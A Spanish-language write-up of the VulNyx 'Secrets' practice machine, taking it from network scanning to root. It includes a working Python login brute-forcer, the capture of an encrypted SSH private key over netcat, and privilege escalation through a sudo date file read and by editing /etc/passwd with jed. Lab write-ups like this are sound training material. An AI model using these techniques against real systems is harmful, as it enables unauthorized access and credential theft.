---
date: 2023-05-13 12:00:00
layout: post
title: Secrets Writeup
subtitle: Writeup de la máquina Secrets de la plataforma VulNyx.
description: Realizaré la máquina Secrets explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Media.
image: https://vulnyx.com/assets/logo.png
optimized_image: https://vulnyx.com/assets/logo.png
category: Writeup
tags:
  - VulNyx
  - Writeup
  - Medium
author: FredBrave
---
# Enumeración
Empezaremos descubriendo la IP de la máquina con la herramienta arp-scan.
```bash
sudo arp-scan 10.0.2.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:ec:3f:6c, IPv4: 10.0.2.48
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1	52:54:00:12:35:00	QEMU
10.0.2.2	52:54:00:12:35:00	QEMU
10.0.2.3	08:00:27:ac:ec:be	PCS Systemtechnik GmbH
10.0.2.111	08:00:27:54:b3:ce	PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.003 seconds (127.81 hosts/sec). 4 responded
```
La IP es la 10.0.2.111 una vez sabido esto haremos dos escaneos hacia la IP para encontrar los puertos abiertos. El primero lo más rápido posible para encontrar solo los puertos abiertos y el segundo más exhaustivo para encontrar los servicios y versiones corriendo bajo los puertos.
```bash
$ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.0.2.111 -oG Targeted 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 15:22 EDT
Nmap scan report for 10.0.2.111
Host is up (0.000089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:54:B3:CE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.16 seconds

$ sudo nmap -p22,80 -sCV 10.0.2.111 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 15:22 EDT
Nmap scan report for 10.0.2.111
Host is up (0.00039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6b36d8beac2439bfbaa9a717e15e00f2 (RSA)
|   256 1d20e44ba4e70871ebd341e1ee941c61 (ECDSA)
|_  256 e3936fb30ba3c30ef70d4cb6db3ced90 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:54:B3:CE (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```
Enumeraremos primero el puerto 80.
<img class="img" src="/assets/img/machines/Secrets/1.png" width="1000">
De primera vista no se ve nada interesante, pero al hacer un CTRL + U  podemos encontrar un comentario al final que nos da un posible usuario.
<img class="img" src="/assets/img/machines/Secrets/2.png" width="800">
No encuentro más así que decido empezar a fuzzear la web.
```bash
ffuf -u http://10.0.2.111/FUZZ -w /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.111/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 2ms]
    * FUZZ: secrets

[Status: 200, Size: 122, Words: 11, Lines: 69, Duration: 33ms]
    * FUZZ: 

[Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 43ms]
    * FUZZ: .php

[Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 10ms]
    * FUZZ: server-status

:: Progress: [441092/441092] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
```
<img class="img" src="/assets/img/machines/Secrets/3.png" width="800">
Encuentro secrets, pero esta ruta no contiene nada interesante aun así sigo fuzzeando, pero dentro de esta en cambio.
```bash
ffuf -u http://10.0.2.111/secrets/FUZZ -w /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.111/secrets/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 429, Words: 51, Lines: 13, Duration: 3ms]
    * FUZZ: login_form.php
```
Encuentro un login.
<img class="img" src="/assets/img/machines/Secrets/4.png" width="800">
Al ingresar cualquier dato este login me redirige a otra ruta dentro de secrets que sigue siendo igual solo que parece que este es la que hace la validación.
<img class="img" src="/assets/img/machines/Secrets/5.png" width="800">
# Shell como brad
No encontré nada más. Por lo que intente un ataque de fuerza bruta al panel del login, para practicar lo hice con un script de python el cual se encargaba de mandar las peticiones y si en la respuesta de dicha petición no había un "Invalid Credentials" entonces me mandaría la clave con la que había intentado ingresar en dicha petición. El script es el siguiente:
```python
import requests, signal, sys

def Exiting(frame, sig):
    print("\n\nExiting of program\n")
    sys.exit(1)

signal.signal(signal.SIGINT, Exiting)

def makeBruteforce(url, wordlist):
    passwords = open(wordlist)
    lines = passwords.readlines()
    for line in lines:
        password = line.strip()
        data = {
         "user": "brad",
         "password": password
        }
        r = requests.post(url, data=data)
        if "Invalid Credentials" in r.text:
            continue
        else:
            print("The password is: " + line)
            sys.exit(1)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("[+] Usage : ./exploit.py target passwords_file")
        exit()

    target = sys.argv[1]
    password = sys.argv[2]

    makeBruteforce(target, password)
```
No intente realizar el script con el rockyou.txt esto es debido a que en las reglas de la plataforma VulNyx para los ataques de fuerza bruta, la password correcta debe estar entre las primeras 5000 líneas. Por lo tanto solo cree una wordlist con estas y lo use. Debido a que teniamos ya un posible usuario (brad) lo intente con este.
```bash
$ cat /usr/share/wordlists/rockyou.txt | head -n 5000 > wordlist
$ python3 brutefor.py http://10.0.2.111/secrets/MK67IT044XYGGIIWLGS9.php wordlist
The password is: bradley
```
La clave parece ser bradley.
Al ingresar las credenciales correctas me lleva a una ruta a la cual tengo que colocar una ip.
<img class="img" src="/assets/img/machines/Secrets/6.png" width="800">
Intento mandar mi ip, pero el input no permite caracteres que no sean números. Intente varias cosas más aquí y como no quedaba mucho más opte por ingresar mi ip en decimal. Para esto, usé la siguiente <a href='https://www.vermiip.es/convertir-ip-decimal/'>página</a>:
<img class="img" src="/assets/img/machines/Secrets/7.png" width="1000">
Y envíe mi ip en decimal al input.
<img class="img" src="/assets/img/machines/Secrets/8.png" width="800">
Al enviar el input me salía el mensaje "Sending hidden secret...". Por lo tanto pensé que me estaba mandando algún tipo de información a mí máquina, por lo que abrí el Wireshark y empecé a ver el tráfico de la red. Una vez hecho esto volví a mandar la petición varias veces y vi esto en el tráfico.
<img class="img" src="/assets/img/machines/Secrets/9.png" width="1000">
Al interpretarlos mejor entendí que cada vez que enviaba la ip en decimal el target intentaba mandarme data al puerto 6666. Sabiendo esto volví a mandar mi ip en decimal, pero esta vez en escucha en el puerto 6666.
```bash
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.0.2.48] from (UNKNOWN) [10.0.2.111] 34618
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,478250418EF67EB4

MvfHsFbuTgPyi0PeU9dWPL8wVaIKHsuvYEIdwNJF42eDz0/L5kdoBnA8+yuWAI28
iI2jtehZHb/7PuaIsCtrzrJ0B1xXZYoeSc4Dfu2j1gi/ToaO3A6RHseHWHsjM9Qw
4AzHS13ze+EQTLHMnTu6eCADEXhwShgrHAmJpw4irdTca+wuY83n38obX0EhrXAs
E8zZfY8yMg4nuq9cP5pZ17IjvQbfk4cvfD4jNN4rXXn8WVlY5tdBH6Bg3lBoZDwD
VfNwZCmUrNIfMamNXjhMzkBNBwPXaNARokQded6c9Ie2PmdPMKPOkL/9QlM77OaE
d0xid9s1u4z2H/Q8GrODUc7eJar95bFLUySNoTiVFPqbVTvQ9tZNSWNTkQ5kgCXj
YRroAtvp0f0UdcPAOFRjsEFqQ4MqwZy26j1rhhAJQKg+q6SkyPv73kRotXajaAK3
irNHqNgzIKmkY9x9rfPTxiGw1oJyJxyNwQ3pZilih5AvI8EQBRVAN7Nb6utjDnkV
u1cjWr6ZN3lC67rhxwXZ9cub1KoQ1pwrzg0Iy1/x2d6zFHeuAkjlSeO8jkUpT1Eb
tdRdrJh712pW9vDg36VaQnrfeNVFPYmku0OXFXgsfiJ+XAJYQX+K2e4N3vRKuXSp
zH5nyL5d1r1Z+wn2s9Ial/zbhCUdOJiwZ87N7yIzCvykMnjEIPwytouWY/Ed4tq8
AqAegiMF5Y7M7+FC+ZH8EUvRCEzUPjS+T0KxgGY1KCTSUfL7QGZwQRKZ1hC879n6
ouj03SFu2VqiuMOXcs8lSjas5vyQgz4XhF58OUzi/BYrqCQBMV3W8RWviJzQvYwV
zBl5lkKsUMJ1Y4xLWBP64LnnEPRViPq7TGxYa6aTZ6rmTIe6dJORhIRVdPilGMYs
4462OpFpIYqWgKNGOJ1GMRf/juiE3J4pBwpslbefxt9SZnwnE9xHgRBInmqJgneC
38EJWyUwJqqlUSSoki3PB19KFpjy9U3YUPPF0Ff8jNg0x3FFLSFqLI4wyTPXH9+J
AalS64ttaP8PoiPxSK9oEXcj8RXVLq99Xdkq9gx25qw/Hca7wOIEUsAmjdtKYMVL
ccsaCrRsC1IMF3Wu1l4ihIwzBBA+l5ZhFIgD9hgUdtinchC3+TRI6r6Cnlbj2rB+
NrSpX7D3X1I5s15FmZuo1kkRH3xxjR1LLRuEjQkg3CTpZnUK5nDLgYo9dSnd0QzM
yOACjV6NiI1PJr7hM08OBuxd5I+FB8JyVJozQMMNoooNdvBNJvFoAXvaqqfY64fu
lYQXXEiPhOVajVGieA2tHmlLf7v6KDCqePZ+/KqxGqn+jIxsjjItCxOlW2OWxWCB
iLsB4JJ0NmKCFJh27wCvyMM1+Z8Kmt2BptCEREBHGxIkOraFBk6MN1bqBBi02UE/
C6piJetSpBUwjOOUs4hiwGRtYf5w4Hut8rsMs79/D3HsG8UPpZsrUKOcv8ZIosOg
+jOuyVfxN44ySVuB2gVVU904GHIdMRyBeR6*****************************
**************************************************
-----END RSA PRIVATE KEY-----
```
Me llego una id\_rsa encriptada.

Guarde la id\_rsa y la desencripte con la herramienta john.
```bash
$ ssh2john id_rsa > hash
$ john -w=/usr/share/wordlists/rockyou.txt hash
```
Encontré la clave de la id\_rsa por lo que intente conectarme a la máquina con el usuario brad que es el único que tenemos.
```bash
ssh -i id_rsa brad@10.0.2.111
Enter passphrase for key 'id_rsa': 
Linux secrets 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
brad@secrets:~$ ls
user.txt
brad@secrets:~$ whoami
brad
```
# Shell como fabian
Enumerando encuentre que tenía permisos para ejecutar como fabian date. Encontré en <a href='https://gtfobins.github.io/gtfobins/date/'>gtfobins</a> que podemos usar este permiso para leer archivos que no me pertenezcan. Así que intente leer la id\_rsa de fabian, pero al parecer no existía.
```bash
brad@secrets:~$ sudo -l
Matching Defaults entries for brad on secrets:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User brad may run the following commands on secrets:
    (fabian) NOPASSWD: /usr/bin/date
brad@secrets:~$ sudo -u fabian /usr/bin/date -f /home/fabian/.ssh/id_rsa
/usr/bin/date: /home/fabian/.ssh/id_rsa: No existe el fichero o el directorio
```
Me puse a pensar en otros archivos que podrían ayudarme a escalar privilegios y entre esos probé .bash\_history para tratar de encontrar alguna antigua autenticación o algo asi.
```bash
brad@secrets:~$ sudo -u fabian /usr/bin/date -f /home/fabian/.bash_history
/usr/bin/date: fecha inválida «cd ~»
/usr/bin/date: fecha inválida «ls -la»
/usr/bin/date: fecha inválida «passwd fabian»
/usr/bin/date: fecha inválida «s3cr3***********»
```
Encontré la posible clave de fabian por lo que la probé a ver si era la verdadera.
```bash
brad@secrets:~$ su fabian
Contraseña: 
fabian@secrets:/home/brad$ whoami
fabian
```
Somos fabian.
# Shell como root.
Nuevamente enumerando encontré que tenía permiso de ejecutar jed como root. Navegando encontré que este era un tipo de editor de archivos por lo que trate de abrir el /etc/passwd con él.

No pude abrirlo directamente en un archivo por lo que lo abrí sin definir uno.
```bash
fabian@secrets:/home/brad$ sudo /usr/bin/jed
```
<img class="img" src="/assets/img/machines/Secrets/10.png" width="1000">
La herramienta tenía un montón de opciones entre ellas estaba abrir un archivo y poder editarlo. Abrí el archivo /etc/passwd para intentar cambiar la clave de root.
<img class="img" src="/assets/img/machines/Secrets/11.png" width="1000">
Ahora lo que hice fue generar una hash de una password con openssl y cambiar la password de root con la mía.
```bash
openssl passwd
Password: 
Verifying - Password: 
$1$Gz3ZSzg4$.ieH68.jHyWNGwmtiXBBB1
```
<img class="img" src="/assets/img/machines/Secrets/12.png" width="800">
Y guarde los cambios.
<img class="img" src="/assets/img/machines/Secrets/13.png" width="800">
Cerré el editor y probé loguearme como root con la clave que había ingresado.
```bash
fabian@secrets:/home/brad$ su root
Contraseña: 
root@secrets:/home/brad# whoami
root
root@secrets:/home/brad#
```
Hemos pwneado la maquina!!!
